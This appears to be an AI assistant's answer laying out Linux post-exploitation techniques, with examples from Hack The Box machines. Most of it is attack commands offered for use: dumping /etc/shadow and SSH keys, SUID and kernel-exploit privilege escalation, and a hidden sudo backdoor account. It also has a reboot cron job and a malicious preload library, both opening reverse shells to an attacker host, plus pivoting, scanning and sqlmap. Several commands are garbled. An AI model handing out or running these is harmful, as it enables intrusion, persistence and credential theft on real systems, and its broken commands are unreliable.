Sure, let's delve into specific post-exploitation techniques and commands on Ubuntu, with examples derived from the principles and methodologies highlighted in the provided documents.

### 1. Gathering Credentials and Sensitive Information

**Example: Enumerating User Credentials**
1. **Dumping Password Hashes**: You can extract password hashes from `/etc/shadow` if you have root access.
     
   cat /etc/ adow
   Use tools like `john` or `hashcat` to crack these hashes.

2. **Searching for SSH Keys**:
     
   find /home -name "*.ssh" -print
   cat /home/<user>/.s /id_rsa

### 2. Privilege Escalation

**Example: Exploiting SUID Binaries**
1. **Finding SUID Binaries**:
     
   find / -perm -4000 -type f 2>/dev/null
2. **Exploiting SUID Binaries**: If you find an SUID binary with known vulnerabilities, you can exploit it. For example, exploiting a vulnerable `cp` command:
     
   cp /bin/  /tmp/ 
   chmod +s /tmp/ 
   /tmp/  -p

**Example: Kernel Exploits**
1. **Using Exploits**: Identify the kernel version and use a public exploit. Always ensure you have permission to do so.
     
   uname -r
   wget <kernel_exploit_url>
   gcc exploit.c -o exploit
   ./exploit

### 3. Maintaining Access

**Example: Creating a Persistent Backdoor**
1. **Adding a User**:
     
   useradd -m backdoor -s /bin/bash
   echo 'backdoor:password' | chpasswd
   usermod -aG sudo backdoor
2. **Setting Up a Cron Job**:
     
   (crontab -l; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'") | crontab -

### 4. Pivoting

**Example: Using SSH for Port Forwarding**
1. **Local Port Forwarding**: Access internal web services on port 8080.
     
   ssh -L 8080:internal_host:80 user@pivot_host
2. **Dynamic Port Forwarding**: Use a SOCKS proxy to route traffic.
     
   ssh -D 1080 user@pivot_host
   export http_proxy="socks5://127.0.0.1:1080"

### 5. Information Gathering

**Example: Internal Network Scanning**
1. **Using `nmap`**:
     
   nmap -sP 10.0.0.0/24
2. **Enumerating Open Ports**:
     
   nmap -p- 10.0.0.1

**Example: File Enumeration**
1. **Searching for Configuration Files**:
     
   find / -name "*.conf"
2. **Searching for Passwords in Files**:
     
   grep -r "password" /etc

### 6. Advanced Exploitation Techniques

**Example: DLL Injection (Linux equivalent: Shared Library Injection)**
1. **Creating a Malicious Shared Library**:
    c
   // malicious.c
   #include <stdio.h>
   static void __attribute__((constructor)) init() {
       system("/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'");
   }
   Compile and inject:
     
   gcc -shared -o malicious.so -fPIC malicious.c
   LD_PRELOAD=/path/to/malicious.so application

**Example: Exploiting Weaknesses in Services**
1. **Targeting an Unpatched Web Application**:
   Use tools like `sqlmap` to exploit SQL injection vulnerabilities:
     
   sqlmap -u "http://target.com/vuln.php?id=1" --dbs

### Examples from the Uploaded Documents:

- **Forge (Machine)**:
  - **SSRF Exploitation**:
      
    echo 'HTTP/1.1 301 Moved Permanently' >> response
    echo 'Location: http://admin.forge.htb/upload?u=ftp://user:password@127.0.0.1/' >> response
    echo '' >> response
    echo '' >> response
    nc -lvnp 80 < response

- **Horizontall (Machine)**:
  - **Strapi CMS Exploit**:
      
     3 exploit.py http://api-prod.horizontall.htb
    # After gaining a shell
    nc -lvnp 9001
    bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'

These examples should give you a robust starting point for post-exploitation techniques on Ubuntu systems. Each command and technique should be tailored to the specific environment and context of your penetration testing engagement.
